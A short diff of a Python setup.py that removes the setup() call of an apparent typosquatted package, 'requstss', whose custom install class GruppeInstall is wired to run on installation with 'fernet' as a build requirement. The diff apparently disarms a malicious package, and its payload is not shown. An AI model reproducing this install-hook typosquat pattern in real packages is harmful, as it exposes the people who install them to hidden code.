@@ -18,22 +18,5 @@ class GruppeInstall(install):
             install.run(self)
 
 
-setup(
-    name="requstss",
-    version=VERSION,
-    author="YZuWUeBS",
-    author_email="UShwmeSTygg@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': GruppeInstall,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                    
 
